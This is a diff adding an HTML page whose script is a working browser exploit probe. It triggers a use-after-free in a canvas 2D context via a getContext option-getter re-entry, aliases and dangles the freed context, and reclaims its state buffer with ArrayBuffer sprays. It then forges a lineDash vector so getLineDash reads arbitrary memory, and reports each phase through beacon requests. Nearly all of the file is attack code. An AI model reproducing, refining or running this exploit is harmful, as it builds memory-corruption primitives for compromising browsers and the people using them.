@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V914</title></head>
+<body><pre id="out">V914 — positive control for the corpse forge: reclaim + consumption proof with zero absolute addresses</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V914-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * v914 — the blocking item from v911_full_grid_close_14_22_20261109.txt:
+ * a POSITIVE CONTROL for the forged-read mechanism on 14.22, needing no
+ * absolute address. Board laws applied:
+ *   L6  — verdict channel = return vs crash, any returned value counts;
+ *         every risky read is PRE-beaconed (image GET queues before the
+ *         next JS line) so a death marks its own position.
+ *   L7  — the lineWidth getter consumes exactly {+112 m_buffer, +124 m_size,
+ *         T+0x30}; nothing else must be poisoned to survive a read.
+ *   L8  — v909 zero-at-free is observer-grade; the GC-path free is UNTESTED.
+ *         This probe is the test: branches on lw after the dangle.
+ *
+ * Construction (v908 fixed):
+ *   1. v908-identical UAF + canvas-spray alias (v904: AB(768) can take the
+ *      freed ctx chunk; canvas contexts take it when sprayed after).
+ *   2. Grow stateStack to 16 levels (B1, the out-of-line buffer,
+ *      16*sizeof(State) bytes; S open on 14.22, candidate range 373-448).
+ *      Last marker lw=1014.
+ *   3. FIXED dangle: v908 nulled spray[aliasIdx].c BEFORE its removeChild
+ *      check, so the element ref was never dropped — the ctx likely never
+ *      died and "chain-not-through-B1" was an artifact. Here all strong
+ *      refs go except the corpse wrapper (innerCtx).
+ *   4. GC churn, then corpse read #1 (PRE-beaconed):
+ *        lw1=1014 -> stale bytes survive the GC-path free (branch STALE, go)
+ *        lw1=0.0  -> GC-path free also zeroes the chunk (branch DEAD, report)
+ *        crash    -> dies at null+0x30; PRE beacon marks it (also DEAD)
+ *   5. Spray an AB size LADDER around the B1 class (5500..7700 step 128 —
+ *      v908 sprayed only AB(6400) while B1 is ~7168B: out of class, its
+ *      P6 no-change is explained without any exotic mechanism).
+ *      Fill mode by query:
+ *        default      every 8-byte word = marker 7777.7777
+ *        ?s=N         zeros; marker only at byte offsets p with p%N==0x30
+ *                     (lw returns the marker IFF sizeof(State)=N; a miss
+ *                     returns 0.0, never crashes — the sweep is safe)
+ *        ?forge=1&s=N&t=HI-LO   as ?s=N plus, at p%N==0xA8, a forged
+ *                     lineDash Vector {m_buffer=T LE, cap=64, size=64};
+ *                     then corpse getLineDash() copies 64 doubles from T:
+ *                     return = T..T+512 mapped (attributed bound); default
+ *                     T is the stack top 0x7fffffffe000 (in-probe positive
+ *                     control — must return if the forge is real).
+ *   6. Corpse read #2 (PRE-beaconed) -> beacon verdict + value hex.
+ *
+ * Modes chain manually via URL (one risk per load, like v911):
+ *   run 1: default        -> CONTROL yes/no
+ *   run 2+: ?s=376..448/8 -> S pin (10 loads)
+ *   last:   ?forge=1&s=<S>&t=7fffffff-e000 -> oracle positive control
+ */
+
+var MARK = 7777.7777;
+var STALE = 1014;
+
+var qs = location.search;
+function qnum(name, def){ var m = qs.match(new RegExp('[?&]'+name+'=(-?[0-9a-fA-F]+)')); return m ? m[1] : def; }
+var mode_s = qnum('s', null);          /* stride pin (decimal or hex) */
+var mode_forge = qs.indexOf('forge=1') >= 0;
+var mode_t = qnum('t', null);          /* 'HI-LO' hex pair */
+
+/* decode T */
+var tHi = 0, tLo = 0, tHex = 'none';
+if (mode_t) {
+  var parts = mode_t.split('-');
+  tHi = parseInt(parts[0], 16); tLo = parseInt(parts[1], 16);
+  tHex = '0x' + ('00000000'+tHi.toString(16)).slice(-8) + ('00000000'+tLo.toString(16)).slice(-8);
+}
+
+function hex(v){
+  var b8=new ArrayBuffer(8), fa=new Float64Array(b8), u=new Uint32Array(b8);
+  fa[0]=v; return '0x'+('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);
+}
+
+/* ---- fill a DataView per mode ---- */
+function fillAB(dv){
+  var len = dv.byteLength;
+  if (!mode_s) {
+    for (var p=0; p+8<=len; p+=8) dv.setFloat64(p, MARK, true);
+  } else {
+    var S = parseInt(mode_s, 16) || parseInt(mode_s, 10);
+    for (var p2=0; p2+8<=len; p2+=8) dv.setFloat64(p2, 0, true);
+    for (var p3=0x30; p3+8<=len; p3+=S) dv.setFloat64(p3, MARK, true);
+    if (mode_forge && mode_t) {
+      for (var p4=0xA8; p4+16<=len; p4+=S) {
+        dv.setUint32(p4,   tLo, true);
+        dv.setUint32(p4+4, tHi, true);
+        dv.setUint32(p4+8, 64,  true);   /* m_capacity */
+        dv.setUint32(p4+12, 64, true);   /* m_size     */
+      }
+    }
+  }
+}
+
+/* ---- PHASE 0: v908-identical UAF + alias ---- */
+var c1=document.createElement('canvas');c1.width=1;c1.height=1;
+var innerCtx=null;
+var opts={};
+Object.defineProperty(opts,'alpha',{get:function(){
+  innerCtx=c1.getContext('2d');
+  innerCtx.lineWidth=99999.5;
+  return true;
+}});
+c1.getContext('bitmaprenderer',opts);
+
+var spray=[];
+for(var s=0;s<300;s++){
+  var sc=document.createElement('canvas');sc.width=1;sc.height=1;
+  spray.push({c:sc,x:sc.getContext('2d')});
+}
+var aliasIdx=-1;
+if(innerCtx){
+  innerCtx.lineWidth=55555.5;
+  for(var k=0;k<spray.length;k++){
+    if(spray[k].x.lineWidth===55555.5){aliasIdx=k;break;}
+  }
+}
+bk('P0','alias='+aliasIdx+' mode='+(mode_forge?'forge':(mode_s?'s'+mode_s:'control')));
+if(aliasIdx<0){ bk('DEAD','no-alias'); }
+else {
+
+/* ---- PHASE 1: grow stateStack to 16 levels ---- */
+for(var i=0;i<15;i++){ innerCtx.save(); innerCtx.lineWidth=1000+i; }
+bk('P1','grown lw='+innerCtx.lineWidth);
+
+/* ---- PHASE 2: fixed dangle — every strong ref out, corpse wrapper kept ---- */
+var el = spray[aliasIdx].c;
+if (el && el.parentNode) el.parentNode.removeChild(el);   /* v908 dead-branch fix */
+spray[aliasIdx].x = null;
+spray[aliasIdx].c = null;
+c1 = null;
+for (var g=0; g<400; g++) { var junk=new ArrayBuffer(65536); }
+bk('P2','refs-dropped');
+
+/* ---- PHASE 3: corpse read #1 (GC-path zero test) ---- */
+bk('P3-PRE','first corpse read');
+var lw1 = innerCtx.lineWidth;
+bk('P3','lw1='+lw1+'|hex='+hex(lw1));
+if (lw1 === 0) {
+  bk('VERDICT','DEAD gc-path-zeroes (like v909 sync path); B1 route closed on 14.22');
+} else if (lw1 !== STALE) {
+  bk('VERDICT','ODD lw1='+hex(lw1)+' — inspect before spraying');
+} else {
+  /* STALE branch: chunk bytes survived the free */
+  /* ---- PHASE 4: AB size ladder around the B1 class ---- */
+  var made=0;
+  for (var sz=5500; sz<=7700; sz+=128) {
+    for (var n=0; n<120; n++) {
+      var ab=new ArrayBuffer(sz);
+      fillAB(new DataView(ab));
+      made++;
+    }
+  }
+  bk('P4','ladder-sprayed n='+made+' mode='+(mode_forge?'forge+s'+mode_s:(mode_s?'s'+mode_s:'marker-every-8')));
+
+  /* ---- PHASE 5: corpse read #2 ---- */
+  bk('P5-PRE','second corpse read');
+  var lw2 = innerCtx.lineWidth;
+  bk('P5','lw2='+lw2+'|hex='+hex(lw2));
+  if (lw2 === MARK) {
+    bk('CONTROL','YES lw consumed the AB fill at a State-lineWidth offset'
+      + (mode_s ? '|s='+mode_s+' pinned' : ' (stride unpinned)'));
+    if (mode_forge && mode_t) {
+      /* ---- PHASE 6: forged lineDash Vector — the oracle ---- */
+      bk('P6-PRE','forged getLineDash at '+tHex);
+      var dash = innerCtx.getLineDash();
+      var dv0=new ArrayBuffer(8), fa0=new Float64Array(dv0), u0=new Uint32Array(dv0);
+      fa0[0]=dash.length ? dash[0] : 0;
+      bk('DASH','len='+dash.length+'|v0hex=0x'+('00000000'+u0[1].toString(16)).slice(-8)+('00000000'+u0[0].toString(16)).slice(-8)
+        +' => '+tHex+'..+512 attributed mapped (return channel)');
+    }
+  } else if (lw2 === STALE) {
+    bk('CONTROL','NO fill not consumed (B1 not reclaimed in class, or read path blind to it)');
+  } else if (lw2 === 0) {
+    bk('CONTROL','CONSUMED-BUT-ZERO fill wiped after spray — allocator scrubs late frees');
+  } else {
+    bk('CONTROL','OTHER lw2='+hex(lw2)+' — inspect');
+  }
+}
+}
+</script></body></html>
